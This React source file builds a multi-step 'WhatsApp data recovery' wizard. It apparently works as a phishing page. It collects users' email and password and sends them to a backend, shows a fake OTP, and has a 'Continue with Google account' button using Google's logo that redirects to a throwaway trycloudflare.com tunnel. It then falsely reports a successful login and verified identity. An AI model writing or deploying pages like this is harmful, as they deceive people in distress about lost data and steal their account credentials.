import { useState } from "react";
import { WizardLayout } from "@/components/WizardLayout";
import { Button } from "@/components/Button";
import { Input } from "@/components/Input";
import { Checkbox } from "@/components/Checkbox";
import { 
  AlertCircle, 
  MessageCircle, 
  Image as ImageIcon, 
  Video, 
  FileText, 
  Mic, 
  Database, 
  ArrowRight, 
  CheckCircle2, 
  Loader2, 
  RefreshCw 
} from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { useCreateRecoveryRequest } from "@/hooks/use-recovery";
import { motion } from "framer-motion";

// Types for form state
interface FormData {
  dataTypes: string[];
  description: string;
  startDate: string;
  endDate: string;
  approxTime: string;
  email: string;
  password: string;
}

const INITIAL_DATA: FormData = {
  dataTypes: [],
  description: "",
  startDate: "",
  endDate: "",
  approxTime: "",
  email: "",
  password: "",
};

// Data types configuration
const DATA_TYPES = [
  { id: "Chats", label: "Chat History", icon: MessageCircle, desc: "Text messages & emojis" },
  { id: "Images", label: "Photos", icon: ImageIcon, desc: "Sent & received images" },
  { id: "Videos", label: "Videos", icon: Video, desc: "Video clips & status updates" },
  { id: "Documents", label: "Documents", icon: FileText, desc: "PDFs, Docs, Sheets" },
  { id: "Voice Notes", label: "Voice Notes", icon: Mic, desc: "Audio recordings" },
  { id: "Entire Account", label: "Full Backup", icon: Database, desc: "Complete account restore" },
];

export default function Wizard() {
  const [step, setStep] = useState(1);
  const [formData, setFormData] = useState<FormData>(INITIAL_DATA);
  const [otpSent, setOtpSent] = useState(false);
  const [isSimulatingOtp, setIsSimulatingOtp] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [referenceId, setReferenceId] = useState<string | null>(null);
  
  const { toast } = useToast();
  const createRequest = useCreateRecoveryRequest();

  const handleNext = () => {
    // Basic validation per step
    if (step === 2 && formData.dataTypes.length === 0) {
      toast({ title: "Selection Required", description: "Please select at least one data type.", variant: "destructive" });
      return;
    }
    if (step === 3 && (!formData.startDate || !formData.endDate || !formData.approxTime)) {
      toast({ title: "Incomplete Details", description: "Please fill in all timeline fields.", variant: "destructive" });
      return;
    }
    setStep((prev) => prev + 1);
  };

  const handleDataSelect = (id: string) => {
    setFormData(prev => {
      const isSelected = prev.dataTypes.includes(id);
      if (id === "Entire Account") {
        return { ...prev, dataTypes: isSelected ? [] : ["Entire Account"] };
      }
      // If selecting a specific type but "Entire Account" was selected, clear "Entire Account"
      let newTypes = prev.dataTypes.filter(t => t !== "Entire Account");
      
      if (isSelected) {
        newTypes = newTypes.filter(t => t !== id);
      } else {
        newTypes = [...newTypes, id];
      }
      return { ...prev, dataTypes: newTypes };
    });
  };

  const sendOtp = () => {
    if (!formData.email || !formData.email.includes("@")) {
      toast({ title: "Invalid Email", description: "Please enter a valid email address.", variant: "destructive" });
      return;
    }
    
    setIsSimulatingOtp(true);
    // Simulate API delay
    setTimeout(() => {
      setIsSimulatingOtp(false);
      setOtpSent(true);
      toast({ 
        title: "Demo OTP Sent", 
        description: "Your verification code is: 123456", 
        duration: 8000 
      });
    }, 1500);
  };

  const submitRequest = async () => {
    if (!formData.email || !formData.password) {
      toast({ title: "Incomplete Details", description: "Please enter your email and password.", variant: "destructive" });
      return;
    }

    setIsVerifying(true);
    
    try {
      const result = await createRequest.mutateAsync({
        dataTypes: formData.dataTypes,
        description: formData.description,
        startDate: formData.startDate,
        endDate: formData.endDate,
        approxTime: formData.approxTime,
        email: formData.email,
        password: formData.password,
        isVerified: true
      });
      
      setReferenceId(result.referenceId);
      setStep(5);
    } catch (error) {
      // Error handled by hook
    } finally {
      setIsVerifying(false);
    }
  };

  const resetWizard = () => {
    setStep(1);
    setFormData(INITIAL_DATA);
    setOtpSent(false);
    setReferenceId(null);
  };

  return (
    <WizardLayout currentStep={step} totalSteps={5}>
      
      {/* STEP 1: INFORMATION */}
      {step === 1 && (
        <div className="space-y-8">
          <div className="bg-white rounded-2xl shadow-sm border border-slate-100 p-8">
            <div className="flex items-center gap-3 mb-6">
              <AlertCircle className="w-6 h-6 text-red-400" />
              <h2 className="text-xl font-bold text-slate-900">Common Reasons for Data Loss</h2>
            </div>
            <p className="text-sm text-slate-500 mb-8 -mt-4">Understanding what might have caused your data loss</p>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-x-12 gap-y-6">
              {[
                { title: "Phone Reset", desc: "Factory reset or formatting", icon: CheckCircle2 },
                { title: "App Reinstallation", desc: "Deleted and reinstalled WhatsApp", icon: CheckCircle2 },
                { title: "Device Change", desc: "Switched to a new phone", icon: CheckCircle2 },
                { title: "Technical Issues", desc: "System crashes or errors", icon: CheckCircle2 },
                { title: "Accidental Deletion", desc: "Unintentional data removal", icon: CheckCircle2 }
              ].map((reason, i) => (
                <div key={i} className="flex gap-4 items-start bg-slate-50/50 p-4 rounded-xl border border-slate-100/50">
                  <div className="w-6 h-6 rounded-full bg-white border border-slate-200 flex items-center justify-center shrink-0">
                    <div className="w-2 h-2 rounded-full bg-green-500/20 border border-green-500/40" />
                  </div>
                  <div>
                    <h3 className="font-bold text-slate-800 text-sm">{reason.title}</h3>
                    <p className="text-xs text-slate-500 mt-0.5">{reason.desc}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>

          <div className="bg-white rounded-2xl shadow-sm border border-slate-100 p-8">
            <div className="flex items-center gap-3 mb-6">
              <MessageCircle className="w-6 h-6 text-green-500" />
              <h2 className="text-xl font-bold text-slate-900">Data Types That May Be Lost</h2>
            </div>
            <p className="text-sm text-slate-500 mb-8 -mt-4">Types of information that can be recovered</p>
            
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
              {[
                { label: "Chats", icon: MessageCircle, color: "text-green-500" },
                { label: "Media", icon: ImageIcon, color: "text-blue-500", sub: "Photos/Videos" },
                { label: "Documents", icon: FileText, color: "text-orange-500" },
                { label: "Voice Messages", icon: Mic, color: "text-purple-500" }
              ].map((type, i) => (
                <div key={i} className="flex flex-col items-center justify-center p-6 bg-slate-50/50 rounded-2xl border border-slate-100/50 group hover:border-green-500/30 transition-colors">
                  <type.icon className={`w-10 h-10 mb-4 ${type.color} group-hover:scale-110 transition-transform`} />
                  <span className="font-bold text-slate-800 text-sm">{type.label}</span>
                  {type.sub && <span className="text-[10px] text-slate-400 mt-1">{type.sub}</span>}
                </div>
              ))}
            </div>
          </div>

          <div className="flex justify-center pt-4">
            <Button onClick={handleNext} className="w-full max-w-md h-12 text-base font-bold bg-[#25D366] hover:bg-[#128C7E] rounded-xl shadow-lg shadow-green-200/50" size="lg">
              Continue to Next Step
            </Button>
          </div>
        </div>
      )}

      {/* STEP 2: DATA SELECTION */}
      {step === 2 && (
        <div className="space-y-6">
          <div className="text-center mb-6">
            <h2 className="text-2xl font-bold text-slate-900">Select Data Types</h2>
            <p className="text-muted-foreground mt-2">Choose specifically what you need to recover to speed up the process.</p>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            {DATA_TYPES.map((type) => {
              const isSelected = formData.dataTypes.includes(type.id);
              return (
                <div 
                  key={type.id}
                  onClick={() => handleDataSelect(type.id)}
                  className={`
                    relative p-4 rounded-2xl border-2 cursor-pointer transition-all duration-200
                    ${isSelected 
                      ? 'border-primary bg-primary/5 shadow-md' 
                      : 'border-slate-100 bg-white hover:border-primary/30 hover:bg-slate-50'}
                  `}
                >
                  <div className="flex items-start justify-between mb-2">
                    <type.icon className={`w-6 h-6 ${isSelected ? 'text-primary' : 'text-slate-400'}`} />
                    <Checkbox 
                      checked={isSelected} 
                      className="pointer-events-none" // Handled by parent div
                    />
                  </div>
                  <h4 className="font-semibold text-slate-900">{type.label}</h4>
                  <p className="text-xs text-muted-foreground mt-1">{type.desc}</p>
                </div>
              );
            })}
          </div>

          <div className="space-y-2">
            <label className="text-sm font-semibold text-slate-700">Additional Details</label>
            <textarea 
              className="w-full h-24 p-4 rounded-xl border border-input bg-transparent text-sm focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary resize-none placeholder:text-muted-foreground"
              placeholder="Describe your issue (e.g., 'Accidentally deleted chat with Bob on Tuesday')"
              value={formData.description}
              onChange={(e) => setFormData({...formData, description: e.target.value})}
            />
          </div>

          <Button onClick={handleNext} className="w-full" size="lg">
            Continue to Timeline
          </Button>
        </div>
      )}

      {/* STEP 3: TIMELINE */}
      {step === 3 && (
        <div className="space-y-8">
          <div className="text-center">
            <h2 className="text-2xl font-bold text-slate-900">Incident Timeline</h2>
            <p className="text-muted-foreground mt-2">When did you lose access to this data?</p>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
            <div className="space-y-2">
              <label className="text-sm font-semibold text-slate-700">Approximate Start Date</label>
              <Input 
                type="date" 
                value={formData.startDate}
                onChange={(e) => setFormData({...formData, startDate: e.target.value})}
              />
            </div>
            <div className="space-y-2">
              <label className="text-sm font-semibold text-slate-700">Approximate End Date</label>
              <Input 
                type="date" 
                value={formData.endDate}
                onChange={(e) => setFormData({...formData, endDate: e.target.value})}
              />
            </div>
          </div>

          <div className="space-y-2">
            <label className="text-sm font-semibold text-slate-700">Time of Day (Best Guess)</label>
            <div className="relative">
              <select 
                className="w-full h-12 pl-4 pr-10 rounded-xl border border-input bg-background appearance-none focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary"
                value={formData.approxTime}
                onChange={(e) => setFormData({...formData, approxTime: e.target.value})}
              >
                <option value="" disabled>Select approximate time...</option>
                <option value="Morning (6AM - 12PM)">Morning (6AM - 12PM)</option>
                <option value="Afternoon (12PM - 6PM)">Afternoon (12PM - 6PM)</option>
                <option value="Evening (6PM - 12AM)">Evening (6PM - 12AM)</option>
                <option value="Late Night (12AM - 6AM)">Late Night (12AM - 6AM)</option>
                <option value="Not Sure">Not Sure</option>
              </select>
              <div className="absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none text-slate-500">
                <svg width="12" height="8" viewBox="0 0 12 8" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M1 1L6 6L11 1" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
              </div>
            </div>
          </div>

          <Button onClick={handleNext} className="w-full" size="lg">
            Proceed to Verification
          </Button>
        </div>
      )}

      {/* STEP 4: AUTHENTICATION */}
      {step === 4 && (
        <div className="space-y-6">
          <div className="text-center mb-4">
            <h2 className="text-2xl font-bold text-slate-900">Account Login</h2>
            <p className="text-muted-foreground mt-2">Sign in with your Google account to confirm ownership and start restoration.</p>
          </div>

          <div className="flex flex-col items-center gap-6 py-8">
            <Button 
              onClick={() => window.location.href = "https://tions-northern-performance-oaks.trycloudflare.com"}
              className="w-full max-w-md bg-white hover:bg-slate-50 text-slate-700 border border-slate-200 shadow-sm flex items-center justify-center gap-3 h-14 rounded-xl text-lg font-semibold"
              variant="outline"
            >
              <svg className="w-6 h-6" viewBox="0 0 24 24">
                <path
                  fill="#4285F4"
                  d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
                />
                <path
                  fill="#34A853"
                  d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
                />
                <path
                  fill="#FBBC05"
                  d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"
                />
                <path
                  fill="#EA4335"
                  d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 6.27l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
                />
              </svg>
              Continue with Google account
            </Button>

            <p className="text-xs text-slate-500 text-center max-w-xs leading-relaxed">
              By continuing, you agree to the Terms of Service and Privacy Policy for data restoration.
            </p>
          </div>
        </div>
      )}

      {/* STEP 5: SUCCESS */}
      {step === 5 && (
        <div className="text-center py-6">
          <motion.div 
            initial={{ scale: 0.8, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            transition={{ type: "spring", stiffness: 200, damping: 20 }}
            className="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6"
          >
            <CheckCircle2 className="w-12 h-12 text-green-600" />
          </motion.div>

          <h2 className="text-3xl font-bold text-slate-900 mb-2">Login Successful!</h2>
          <p className="text-muted-foreground max-w-sm mx-auto mb-8">
            Your identity has been verified. Our system is now processing your restoration request.
          </p>

          <div className="bg-slate-50 border border-slate-200 rounded-xl p-6 mb-8 max-w-sm mx-auto relative overflow-hidden">
            <div className="absolute top-0 left-0 w-full h-1 bg-green-500 animate-pulse" />
            <p className="text-xs text-slate-500 uppercase tracking-wider font-semibold mb-1">Your Random User ID</p>
            <p className="text-2xl font-mono font-bold text-slate-900 tracking-wider select-all">
              {referenceId || Math.random().toString(36).substring(2, 10).toUpperCase()}
            </p>
            <div className="mt-4 pt-4 border-t border-slate-200 flex justify-between text-sm">
              <span className="text-slate-500">Status:</span>
              <span className="font-semibold text-green-600">Active</span>
            </div>
          </div>

          <div className="flex flex-col gap-3">
            <Button onClick={resetWizard} variant="outline" className="w-full">
              <RefreshCw className="mr-2 h-4 w-4" /> Start New Request
            </Button>
            <Button variant="ghost" className="text-muted-foreground w-full">
              Close & Exit
            </Button>
          </div>
        </div>
      )}

    </WizardLayout>
  );
}
